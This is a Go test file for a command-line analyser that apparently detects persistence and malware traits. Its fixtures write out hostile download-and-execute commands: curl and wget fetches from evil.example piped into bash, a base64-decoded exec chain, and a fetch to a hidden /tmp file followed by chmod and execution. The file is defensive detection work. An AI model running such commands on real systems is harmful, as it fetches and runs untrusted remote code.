package persistence

import (
	"strings"
	"testing"
)

// --- chained shell extraction (Phase 5 §3) --------------------------------

func TestExtractShellCommandQuoted(t *testing.T) {
	inner, shell, ok := extractShellCommand(`/bin/sh -c "curl -fsSL http://x/i.sh | bash"`)
	if !ok {
		t.Fatal("quoted -c invocation not recognized")
	}
	if shell != "sh" {
		t.Errorf("shell = %q", shell)
	}
	if inner != "curl -fsSL http://x/i.sh | bash" {
		t.Errorf("inner = %q", inner)
	}
}

func TestExtractShellCommandSingleQuoted(t *testing.T) {
	inner, _, ok := extractShellCommand(`/bin/bash -c 'echo aGVsbG8= | base64 -d | bash'`)
	if !ok {
		t.Fatal("single-quoted -c invocation not recognized")
	}
	if inner != "echo aGVsbG8= | base64 -d | bash" {
		t.Errorf("inner = %q", inner)
	}
}

func TestExtractShellCommandUnquoted(t *testing.T) {
	// POSIX: everything after the command string is positional parameters,
	// so only the first token is the command.
	inner, _, ok := extractShellCommand("sh -c wget -q http://x")
	if !ok || inner != "wget" {
		t.Fatalf("inner = %q ok = %v, want wget", inner, ok)
	}
}

func TestExtractShellCommandFlagCluster(t *testing.T) {
	inner, _, ok := extractShellCommand(`/bin/bash -lc "/opt/app/start"`)
	if !ok || inner != "/opt/app/start" {
		t.Fatalf("flag-cluster -c not recognized: inner=%q ok=%v", inner, ok)
	}
}

func TestExtractShellCommandNegative(t *testing.T) {
	for _, cmd := range []string{
		"/bin/sh /script.sh",       // no -c at all
		"/bin/sh --rcfile /etc/rc", // long option, not a -c invocation
		"sh -c",                    // flag without a command
		"nginx -c /etc/nginx.conf", // not a shell
	} {
		if inner, _, ok := extractShellCommand(cmd); ok {
			t.Errorf("%q: unexpected extraction %q", cmd, inner)
		}
	}
}

func TestAnalyzeCommandShellWrapperDownloadExec(t *testing.T) {
	tr := AnalyzeCommand(`/bin/sh -c "curl -fsSL http://evil.example/i.sh | bash"`)
	if !tr.Downloads || !tr.PipeIntoExec {
		t.Fatalf("expected download-exec through the wrapper, got %+v", tr)
	}
	// The wrapper shell is the runner, not the payload: the primary
	// inspectable target must not be /bin/sh.
	if tr.ExecPath != "" {
		t.Errorf("ExecPath = %q, want empty (no inspectable inner target)", tr.ExecPath)
	}
}

func TestAnalyzeCommandShellWrapperInnerTarget(t *testing.T) {
	tr := AnalyzeCommand(`/bin/sh -c "/opt/.srv/agent --run"`)
	if tr.ExecPath != "/opt/.srv/agent" {
		t.Fatalf("ExecPath = %q, want the inner payload target", tr.ExecPath)
	}
	if len(tr.HiddenPaths) == 0 {
		t.Errorf("inner hidden path not merged into traits")
	}
}

func TestAnalyzeCommandShellWrapperEncoded(t *testing.T) {
	tr := AnalyzeCommand(`/bin/bash -c "echo aGVsbG8= | base64 -d | bash"`)
	if !tr.Encoded || !tr.PipeIntoExec {
		t.Fatalf("expected encoded exec chain through the wrapper, got %+v", tr)
	}
}

func TestAnalyzeCommandNestedShellDepth(t *testing.T) {
	// Alternating quote styles nest without escaped quotes, which the
	// bounded extractor follows (depth 2 of the 4-level bound).
	tr := AnalyzeCommand(`/bin/sh -c "bash -c 'curl -fsSL http://evil.example/x | sh'"`)
	if !tr.Downloads || !tr.PipeIntoExec {
		t.Fatalf("nested chain not detected within depth bound: %+v", tr)
	}
	// Escaped inner quotes are unsupported syntax: the extractor declines
	// them and the outer-line result stands (no fabricated evidence).
	escaped := AnalyzeCommand("/bin/sh -c \"bash -c 'sh -c \\\"curl -fsSL http://evil.example/x | sh\\\"'\"")
	if escaped.PipeIntoExec {
		t.Fatalf("unsupported escaped quoting must not be claimed as analyzed: %+v", escaped)
	}
}

func TestAnalyzeCommandHugeEmbeddedCommandBounded(t *testing.T) {
	// An embedded command beyond the size limit is skipped without
	// exhausting resources; the outer line is still analyzed.
	big := strings.Repeat("a", maxEmbeddedCommand+1)
	tr := AnalyzeCommand("/bin/sh -c \"" + big + "\"")
	if tr.Raw == "" {
		t.Fatal("outer command lost")
	}
}

func TestAnalyzeCommandDeepNestingBounded(t *testing.T) {
	// Nesting far beyond the depth bound terminates deterministically.
	cmd := "sh -c \"x\""
	for i := 0; i < 20; i++ {
		cmd = "sh -c " + quoteForTest(cmd)
	}
	tr := AnalyzeCommand(cmd)
	if tr.Raw == "" {
		t.Fatal("outer command lost")
	}
}

func quoteForTest(s string) string {
	return "\"" + strings.ReplaceAll(s, "\"", "\\\"") + "\""
}

// --- write-then-exec inside one command line (Phase 5 §4) -----------------

func TestAnalyzeCommandWriteThenExecChain(t *testing.T) {
	tr := AnalyzeCommand("wget -q http://evil.example/drop.sh -O /tmp/.d && chmod +x /tmp/.d && /tmp/.d")
	if !tr.Downloads || !tr.ChainedExec {
		t.Fatalf("expected fetch-write-exec chain, got %+v", tr)
	}
	if len(tr.Writes) != 1 || tr.Writes[0] != "/tmp/.d" {
		t.Errorf("Writes = %v, want [/tmp/.d]", tr.Writes)
	}
}

func TestAnalyzeCommandWriteThenShellExec(t *testing.T) {
	tr := AnalyzeCommand("curl -s http://evil.example/x -o /tmp/p && sh /tmp/p")
	if !tr.Downloads || !tr.ChainedExec {
		t.Fatalf("expected fetch-write-shell-exec chain, got %+v", tr)
	}
}

func TestAnalyzeCommandRedirectWriteThenExec(t *testing.T) {
	tr := AnalyzeCommand("curl -fsSL http://evil.example/i > /tmp/.p; /tmp/.p")
	if !tr.Downloads || !tr.ChainedExec {
		t.Fatalf("expected redirect-write-exec chain, got %+v", tr)
	}
}

func TestAnalyzeCommandWriteExecNegative(t *testing.T) {
	for _, cmd := range []string{
		// Data download, not a payload write-then-exec.
		"curl -s http://mirror.example/data.csv -o /var/lib/app/data && app-import /var/lib/app/data",
		// Strings containing redirection characters are not writes.
		`echo "a > /tmp/x is documentation"`,
		// fd duplication is not a file write.
		"curl -fsSL http://evil.example/c2.sh | bash >/dev/null 2>&1",
	} {
		tr := AnalyzeCommand(cmd)
		if tr.ChainedExec {
			t.Errorf("%q misclassified as write-then-exec: %+v", cmd, tr)
		}
	}
}

// --- ExecPath derivation ---------------------------------------------------

func TestFirstExecutablePath(t *testing.T) {
	cases := []struct{ in, want string }{
		{"/opt/removed/tool --run", "/opt/removed/tool"},
		{"/usr/bin/env X", ""},
		{"timeout 30 /tmp/.x/pay", "/tmp/.x/pay"},
		{"nginx --daemon", ""},
		{"/bin/sh -c \"echo ok\"", "/bin/sh"},
		{"~/bin/tool", "~/bin/tool"},
		{"$HOME/bin/tool", "$HOME/bin/tool"},
		{"", ""},
	}
	for _, c := range cases {
		if got := firstExecutablePath(c.in); got != c.want {
			t.Errorf("firstExecutablePath(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestAnalyzeCommandRedactionPreservedThroughWrappers(t *testing.T) {
	tr := AnalyzeCommand(`/bin/sh -c "/opt/agent --password=hunter2 run"`)
	if strings.Contains(tr.Raw, "hunter2") {
		t.Fatalf("credential leaked through evidence: %q", tr.Raw)
	}
}
